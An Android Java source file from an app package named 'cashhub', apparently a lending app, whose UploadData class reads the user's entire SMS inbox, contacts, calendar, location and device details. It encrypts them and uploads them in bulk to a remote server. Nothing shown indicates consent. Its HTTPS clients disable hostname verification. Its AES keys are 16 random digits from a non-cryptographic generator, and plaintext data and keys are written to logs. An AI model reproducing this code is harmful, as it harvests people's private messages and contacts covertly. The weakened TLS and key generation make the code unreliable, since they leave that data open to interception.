package com.cashhub.cash.common;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build.VERSION_CODES;
import android.os.Bundle;
import android.util.Log;
import androidx.annotation.RequiresApi;
import com.alibaba.fastjson.JSONException;
import com.alibaba.fastjson.JSONObject;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * class name：SmsContent
 * class description：获取手机中的各种短信信息<BR>
 * PS： 需要权限 <uses-permission android:name="android.permission.READ_SMS" />
 */
public class UploadData {

  private static final String TAG = "UploadData";
  private static final int mMaxCount = 100;
  private static final String rsaPublicKey =
      "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC4SdE5JJ54SL7wZhOglZNba2vaDC83yLTNQ9ybP6CIO+HDvRCZ/TiFbNNmbfo/xmRx0zU0Y+tZCRrzJhZ9MzzAR7odQnxL/fQlcIuC2MjqvvZ0VpbsbFFqcuqbmzgkbH+p5DdcbrJrDZy5dNr1ccprT3LPGdYgClvRAHodviEcMQIDAQAB";

  private Context mContext;//这里有个activity对象，不知道为啥以前好像不要，现在就要了。自己试试吧。
  private com.cashhub.cash.common.SystemInfo mSystemInfo;
  private JSONObject mThisystemInfo = new JSONObject();
  private String mToken = "";
  private String mDomain = "";
  private long mTimeStamp = 0L;
  private String mDeviceKey = "";

  //所有的短信
  public static final String SMS_URI_ALL = "content://sms/";

  private String mPostUrlOssSign = "/v1/oss/sign";
  private String mPostUrlReport = "/v1/device/report-data";

  //获取位置信息
  private LocationManager locationManager;
  private String locationProvider;

  /**
   * 字符编码(用哪个都可以，要注意new String()默认使用UTF-8编码 getBytes()默认使用ISO8859-1编码)
   */
  private static final Charset CHARSET_UTF8 = StandardCharsets.UTF_8;

  List<JSONObject> mInfoList = new ArrayList<>();


  public UploadData(Context context) {
    this.mContext = context;
  }

  /**
   * 获取设备信息
   */
  @RequiresApi(api = VERSION_CODES.M)
  public void getAndSendDevice(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
    Log.d(TAG, "getAndSendDevice Start!!!");
    if(domain == null || domain.isEmpty()) {
      return;
    }
    if(systemInfo == null) {
      systemInfo = new JSONObject();
    }
    Log.d(TAG, "device post data:" + systemInfo.toString());
    sendRequest(systemInfo, token, domain, deviceKey, "device");
  }

  /**
   * 获取联系人信息
   */
  @RequiresApi(api = VERSION_CODES.M)
  public void getAndSendContact(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
    Log.d(TAG, "getAndSendContact Start!!!");
    if(domain == null || domain.isEmpty()) {
      return;
    }

    if(mSystemInfo == null) {
      this.mSystemInfo = new com.cashhub.cash.common.SystemInfo(mContext);
    }
    List<JSONObject> contact = mSystemInfo.getAllContacts();
    Log.d(TAG, "contact post data:" + contact.toString());
    if(systemInfo == null) {
      systemInfo = new JSONObject();
    }
    systemInfo.remove("contact");
    systemInfo.put("contact", contact);
    sendRequest(systemInfo, token, domain, deviceKey, "contact");
  }

  /**
   * 获取短信的各种信息
   *
   * 读取的短信信息有：
   *
   *   _id：短信序号，如100
   * thread_id：对话的序号，如100，与同一个手机号互发的短信，其序号是相同的
   * address：发件人地址，即手机号，如+8613811810000
   * person：发件人，如果发件人在通讯录中则为具体姓名，陌生人为null
   * date：日期，long型，如1256539465022，可以对日期显示格式进行设置
   * protocol：协议0SMS_RPOTO短信，1MMS_PROTO彩信
   * read：是否阅读0未读，1已读
   * status：短信状态-1接收，0complete,64pending,128failed
   * type：短信类型1是接收到的，2是已发出
   * body：短信具体内容
   * service_center：短信服务中心号码编号，如+8613800755500
   *
   */
  @RequiresApi(api = VERSION_CODES.M)
  public void getAndSendSms(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
    Log.d(TAG, "getAndSendSms Start!!!");
    if(domain == null || domain.isEmpty()) {
      return;
    }
    if(systemInfo == null) {
      systemInfo = new JSONObject();
    }

    Uri mUri = Uri.parse(UploadData.SMS_URI_ALL);

    String[] projection = new String[] { "_id", "address", "person",

        "body", "date", "type" };

    Cursor cusor = mContext.getApplicationContext().getContentResolver().query(mUri, projection, "date >= " + timeStamp, null,

        "date desc");

    int smsId = cusor.getColumnIndex("_id");

    int personColumn = cusor.getColumnIndex("person");

    int addressColumn = cusor.getColumnIndex("address");

    int bodyColumn = cusor.getColumnIndex("body");

    int dateColumn = cusor.getColumnIndex("date");

    int typeColumn = cusor.getColumnIndex("type");

    if (cusor != null) {

      while (cusor.moveToNext()) {
        try {
          JSONObject smsInfo = new JSONObject();
          smsInfo.put("id", cusor.getString(smsId));
          smsInfo.put("name", cusor.getString(addressColumn));
          smsInfo.put("content", cusor.getString(bodyColumn));
          smsInfo.put("type", cusor.getString(typeColumn));
          smsInfo.put("date", cusor.getString(dateColumn));
          Log.i(TAG, "smsInfo:" + smsInfo.toString());
          mInfoList.add(smsInfo);
        } catch (Exception e) {

        }

        //每1000条数据上传一次
        if(mInfoList != null && mInfoList.size() > 0 && mInfoList.size() >= mMaxCount) {
          systemInfo.remove("sms");
          systemInfo.put("sms", mInfoList);
          mInfoList = new ArrayList<>();
          sendRequest(systemInfo, token, domain, deviceKey, "sms");
        }
      }

      cusor.close();

      if(mInfoList != null && mInfoList.size() > 0) {
        systemInfo.remove("sms");
        systemInfo.put("sms", mInfoList);
        mInfoList = new ArrayList<>();
        sendRequest(systemInfo, token, domain, deviceKey, "sms");
      }
    }
  }

  /**
   * 获取日历信息
   */
  @RequiresApi(api = VERSION_CODES.M)
  public void getAndSendCalendar(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
    Log.d(TAG, "getAndSendCalendar Start!!!");
    if(domain == null || domain.isEmpty()) {
      return;
    }
    if(mSystemInfo == null) {
      this.mSystemInfo = new com.cashhub.cash.common.SystemInfo(mContext);
    }
    List<JSONObject> calendars = mSystemInfo.getCalendars();
    Log.d(TAG, "calendars post data:" + calendars.toString());
    if(systemInfo == null) {
      systemInfo = new JSONObject();
    }
    systemInfo.remove("calendar");
    systemInfo.put("calendar", calendars);
    sendRequest(systemInfo, token, domain, deviceKey, "calendar");
  }

  /**
   * 获取位置信息
   */
  @RequiresApi(api = VERSION_CODES.M)
  public void getAndSendLocation(JSONObject systemInfo, String token, String domain, long timeStamp,
      String deviceKey) {
    Log.d(TAG, "getAndSendLocation Start!!!");
    if(domain == null || domain.isEmpty()) {
      return;
    }
//    JSONObject location = LocationUtils.getInstance().getLatAndLng(mContext);
    if(systemInfo == null) {
      systemInfo = new JSONObject();
    }
//    systemInfo.remove("map");
//    systemInfo.put("map", location);
    Log.d(TAG, "location post data:" + systemInfo.get("location"));
    sendRequest(systemInfo, token, domain, deviceKey, "location");
  }

  /**
   * 获取位置信息
   */
  @RequiresApi(api = VERSION_CODES.M)
  public void getAndSendLocation2(JSONObject systemInfo, String token, String domain,
      long timeStamp, String deviceKey) {
    Log.d(TAG, "getAndSendLocation Start!!!");
    if(domain == null || domain.isEmpty()) {
      return;
    }
//    JSONObject location = LocationUtils.getInstance().getLatAndLng(mContext);
    if(systemInfo != null) {
      this.mThisystemInfo = systemInfo;
    }
    if (token != null) {
      this.mToken = token;
    }
    if(domain != null) {
      this.mDomain = domain;
    }
    if(deviceKey != null) {
      this.mDeviceKey = deviceKey;
    }
    this.mTimeStamp = timeStamp;

    getLocation();
    double[] locationJson =
        com.cashhub.cash.common.utils.LocationUtils.getLatAndLng(mContext.getApplicationContext());
    Log.d(TAG, "getAndSendLocation2 locationJson: " + locationJson[0] + "," + locationJson[1]);
  }


  @RequiresApi(api = VERSION_CODES.M)
  private void getLocation() {
    //1.获取位置管理器
    locationManager = (LocationManager) mContext.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
    //2.获取位置提供器，GPS或是NetWork
    List<String> providers = locationManager.getProviders(true);
    Log.e(TAG, providers.toString());
    if (providers.contains(LocationManager.NETWORK_PROVIDER)) {
      //如果是网络定位
      locationProvider = LocationManager.NETWORK_PROVIDER;
      Log.e(TAG, "locationManager 网络");
    } else if (providers.contains(LocationManager.GPS_PROVIDER)) {
      //如果是GPS定位
      locationProvider = LocationManager.GPS_PROVIDER;
      Log.e(TAG, "locationManager gps");
    } else {
      Log.e(TAG, "没有可用的位置提供器");
//      Toast.makeText(this, "没有可用的位置提供器", Toast.LENGTH_SHORT).show();
      return;
    }

    //3.获取上次的位置，一般第一次运行，此值为null
    if (mContext.getApplicationContext().checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
        mContext.getApplicationContext().checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
      // TODO: Consider calling
      //    ActivityCompat#requestPermissions
      // here to request the missing permissions, and then overriding
      //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
      //                                          int[] grantResults)
      // to handle the case where the user grants the permission. See the documentation
      // for ActivityCompat#requestPermissions for more details.

      Log.e(TAG, "没权限");
      return;
    }
    Location location = locationManager.getLastKnownLocation(locationProvider);
    if (location != null) {
      Log.e(TAG, "location != null");
      sendLocation(location);
    } else {
      Log.e(TAG, "location == null");
      // 监视地理位置变化，第二个和第三个参数分别为更新的最短时间minTime和最短距离minDistace
      locationManager.requestLocationUpdates(locationProvider, 0, 0, mListener);
    }
  }

  @RequiresApi(api = VERSION_CODES.M)
  private void sendLocation(Location location) {
    JSONObject locationObj = new JSONObject();
    if(location != null) {
      locationObj.put("longitude", location.getLongitude());
      locationObj.put("latitude", location.getLatitude());
    }
    if(this.mThisystemInfo == null) {
      this.mThisystemInfo = new JSONObject();
    }
    Log.d(TAG, "location get data:" + locationObj);
    this.mThisystemInfo.remove("location");
    this.mThisystemInfo.put("location", locationObj);
    sendRequest(this.mThisystemInfo, this.mToken, this.mDomain, this.mDeviceKey, "location");
  }

  LocationListener mListener = new LocationListener() {
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
      Log.e(TAG, "onStatusChanged");
    }

    @Override
    public void onProviderEnabled(String provider) {
      Log.e(TAG, "onProviderEnabled");
    }

    @Override
    public void onProviderDisabled(String provider) {

      Log.e(TAG, "onProviderDisabled");
    }

    // 如果位置发生变化，重新显示
    @RequiresApi(api = VERSION_CODES.M)
    @Override
    public void onLocationChanged(Location location) {
      Log.e(TAG, "onLocationChanged");
      sendLocation(location);
    }
  };


  private void sendRequest(final JSONObject systemInfo, final String token, final String domain, final String deviceKey,
      final String type) {
    //发起请求
    new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          postOssSign(systemInfo, token, domain, deviceKey, type);
        } catch (Exception e) {
          e.printStackTrace();
        }
      }
    }).start();
  }

  @RequiresApi(api = VERSION_CODES.M)
  private void postOssSign(JSONObject systemInfo, String token, String domain, String deviceKey, String type) {
    //参数校验
    if(type == null || type.isEmpty()) {
      return;
    }
    JSONObject json = new JSONObject();
    try {
      json.put("device_key", deviceKey);
    } catch (JSONException e) {
      e.printStackTrace();
    }
    RequestBody requestBody = FormBody.create(json.toString(), MediaType.parse("application/json"));

    Request request = new Request.Builder()
            .addHeader("Authorization", token)
            .url(domain + mPostUrlOssSign)
            .post(requestBody)
            .build();

    Log.d(TAG, "postOssSign device url: " + domain + mPostUrlOssSign);

    Response response = null;
    String bodyStr = "";

    Pattern p = Pattern.compile("((https)://)", Pattern.CASE_INSENSITIVE);
    Matcher matcher = p.matcher(domain);
    boolean isMatcher = matcher.find();
    if (isMatcher) {

      Log.d(TAG, "postOssSign device https");

      try {
        HttpsUtils.SSLParams sslParams1 = HttpsUtils.getSslSocketFactory();
        OkHttpClient.Builder  builder=new  OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .sslSocketFactory(sslParams1.sSLSocketFactory, sslParams1.trustManager)//添加信任证书
                .hostnameVerifier((hostname, session) -> true) //忽略host验证
                .followRedirects(false);  //禁制OkHttp的重定向操作，我们自己处理重定向

        OkHttpClient client =builder.build();
        response = client.newCall(request).execute();

        if(response == null || response.code() != 200) {
          Log.d(TAG, "postOssSign response is Null or code not 200" + response.code() + " " + response.message());
          response.body().close();
          return;
        }
        bodyStr = response.body().string();
      } catch (Exception e) {
        Log.d(TAG, "postOssSign onFailure " + e.getMessage());
      }

    } else {

      Log.d(TAG, "postOssSign device http");

      try {
        OkHttpClient okHttpClient = new OkHttpClient();
        response = okHttpClient.newCall(request).execute();

        if(response == null || response.code() != 200) {
          Log.d(TAG, "postOssSign response is Null or code not 200");
          response.body().close();
          return;
        }
        bodyStr = response.body().string();

      } catch (Exception e) {
        Log.d(TAG, "postOssSign onFailure " + e.getMessage());
      }

    }

    putDataSignUrl(systemInfo, bodyStr, token, domain, deviceKey, type);

    Log.d(TAG, "postOssSign onResponse");
  }


  @RequiresApi(api = VERSION_CODES.M)
  private void putDataSignUrl(JSONObject systemInfo, String bodyStr, String token, String domain,
      String deviceKey, String type) {
    Log.d(TAG, "putDataSignUrl bodyStr:" + bodyStr);
    if(bodyStr == null || bodyStr.isEmpty()) {
      return;
    }

    Gson gson = new Gson();
    SignResponseInfo signResponseInfo = gson.fromJson(bodyStr, new TypeToken<SignResponseInfo>(){}.getType());
    if(signResponseInfo != null && signResponseInfo.getData() != null) {
      Log.d(TAG, "putDataSignUrl signResponseInfo:" + signResponseInfo.toString());
      Map<String, String> signData = signResponseInfo.getData();
      if(signData != null && !signData.isEmpty()) {
        String signUrl = signData.get("sign_url");
        if(signUrl != null && !signUrl.isEmpty()) {

          //转码 sign_url 因 json 提炼导致 \u2006 转义成了 &
          try{
            //signUrl = signUrl.replaceAll("[&]", "\\u0026").trim();
            Log.d(TAG, "putDataSignUrl sign url:" + signUrl);
          } catch(Exception e){
            Log.d(TAG, "putDataSignUrl sign url exception:" + e.getMessage());
          }

          //ase加密
          String aseKey = generateRandomStr(16); //秘钥-16位随机数
          Log.d(TAG, "putDataSignUrl aseKey:" + aseKey);
          String aesEncrypt = "";

          if(type == "device") {
            //设备信息
            Log.d(TAG, "putDataSignUrl device:" + systemInfo.toString());
            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.toString());
            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
          } else if(type == "contact") {
            //联系人信息
            Log.d(TAG, "putDataSignUrl contact:" + systemInfo.get("contact").toString());
            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("contact").toString());
            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
          } else if(type == "sms") {
            //短信字符串
            Log.d(TAG, "putDataSignUrl sms:" + systemInfo.get("sms").toString());
            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("sms").toString());
            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
          } else if(type == "calendar") {
            //日历信息
            Log.d(TAG, "putDataSignUrl calendar:" + systemInfo.get("calendar").toString());
            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("calendar").toString());
            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
          } else if(type == "location") {
            //位置信息
            Log.d(TAG, "putDataSignUrl location:" + systemInfo.get("location").toString());
            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("location").toString());
            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
          } else {

          }

          //构造请求 body
          RequestBody requestBody1 = FormBody.create(aesEncrypt.getBytes(StandardCharsets.UTF_8));
          try{
            Log.d(TAG, "putDataSignUrl requestBody contentType:" + requestBody1.contentType());
          } catch(Exception e){
            Log.d(TAG, "putDataSignUrl requestBody contentType:" + e.getMessage());
          }

          //构造 put 请求
          Request request1 = new Request.Builder()
              .url(signUrl)
              .addHeader("Content-Type","multipart/form-data")
              .addHeader("Access-Control-Allow-Origin", "*")
              .put(requestBody1)
              .build();

          //发起同步请求
          try {
            Log.d(TAG, "putDataSignUrl oss https");

            HttpsUtils.SSLParams sslParams = HttpsUtils.getSslSocketFactory();
            OkHttpClient.Builder  builder1=new  OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .sslSocketFactory(sslParams.sSLSocketFactory, sslParams.trustManager)//添加信任证书
                .hostnameVerifier((hostname, session) -> true) //忽略host验证
                .followRedirects(false);  //禁制OkHttp的重定向操作，我们自己处理重定向

            OkHttpClient client =builder1.build();
            Response response1 = client.newCall(request1).execute();
            if(response1 == null || response1.code() != 200) {
              Log.d(TAG, "putDataSignUrl response is Null or code not 200" + response1.code() + " " + response1.message());
              return;
            }

            //调用report上报
            postReportData(token, domain, signUrl, aseKey, deviceKey, type);
          } catch (Exception e) {
            Log.d(TAG, "putDataSignUrl onFailure" + e.getMessage());
          }

        }
      }
    }
  }

  @RequiresApi(api = VERSION_CODES.M)
  private void postReportData(String token, String domain, String dataUrl, String aseKey,
      String deviceKey, String type) {

    if(dataUrl == null || dataUrl.isEmpty()) {
      return;
    }

    //rsa 加密
    String rsaEncrypt = "";
    try {
      rsaEncrypt = RSAUtils.encryptRSAToString(aseKey, rsaPublicKey);
    } catch (Exception e) {
      Log.e(TAG, "postReportData rsaEncrypt exception:" + e.getMessage());
    }
    Log.d(TAG, "postReportData rsaEncrypt:" + rsaEncrypt);

    JSONObject json = new JSONObject();
    try {
      json.put("device_key", deviceKey);
      json.put("data_url", dataUrl);
      json.put("aes_pwd", rsaEncrypt);
      if(type == "device") {
        json.put("data_type", 1);
      } else if(type == "contact") {
        json.put("data_type", 2);
      } else if(type == "sms") {
        json.put("data_type", 3);
      } else if(type == "calendar") {
        json.put("data_type", 4);
      } else if(type == "location") {
        json.put("data_type", 5);
      } else {
        json.put("data_type", 0);
      }
    } catch (JSONException e) {
      e.printStackTrace();
    }
    RequestBody requestBody = FormBody.create(json.toString(), MediaType.parse("application/json"));

    Request request = new Request.Builder()
        .addHeader("Content-Type", "application/json")
        .addHeader("Authorization", token)
        .url(domain + mPostUrlReport)
        .post(requestBody)
        .build();

    Log.d(TAG, "postReportData url: " + domain + mPostUrlReport);

    Pattern p = Pattern.compile("((https)://)", Pattern.CASE_INSENSITIVE);
    Matcher matcher = p.matcher(domain);
    boolean isMatcher = matcher.find();
    if (isMatcher) {
      Log.d(TAG, "postReportData https");

      //发起同步请求
      try {
        HttpsUtils.SSLParams sslParams2 = HttpsUtils.getSslSocketFactory();
        OkHttpClient.Builder  builder2 = new  OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .writeTimeout(10, TimeUnit.SECONDS)
                .sslSocketFactory(sslParams2.sSLSocketFactory, sslParams2.trustManager)//添加信任证书
                .hostnameVerifier((hostname, session) -> true) //忽略host验证
                .followRedirects(false);  //禁制OkHttp的重定向操作，我们自己处理重定向

        OkHttpClient client3 = builder2.build();
        Response response2 = client3.newCall(request).execute();
        if (response2 == null || response2.code() != 200) {
          Log.d(TAG, "postReportData response is Null or code not 200" + response2.code() + " " + response2.message());
          return;
        }
        String str = response2.body().string();
        Log.d(TAG, "postReportData onResponse" + str);
      } catch (IOException e) {
        Log.d(TAG, "postReportData onFailure" + e.getMessage());
      }
    } else {

      Log.d(TAG, "postReportData http");

      OkHttpClient okHttpClient = new OkHttpClient();
      Call call = okHttpClient.newCall(request);
      call.enqueue(new Callback() {
        @Override
        public void onFailure(Call call, IOException e) {
          Log.d(TAG, "postReportData onFailure" + e.getMessage());
        }
        @Override
        public void onResponse(Call call, Response response) throws IOException {
          String str = response.body().string();
          Log.d(TAG, "postReportData onResponse" + str);
        }
      });

    }

  }

  /**
   * 获取随机字符串
   */
  private String generateRandomStr(int length) {
    ArrayList<String> strList = new ArrayList<String>();
    Random random = new Random();

    //将0-9的数字加入集合
    for (int i = 0; i < 10; i++) {
      strList.add(i + "");
    }

    StringBuffer sb = new StringBuffer();
    int size = strList.size();
    for (int i = 0; i < length; i++) {
      String randomStr = strList.get(random.nextInt(size));
      sb.append(randomStr);
    }
    return sb.toString();
  }
}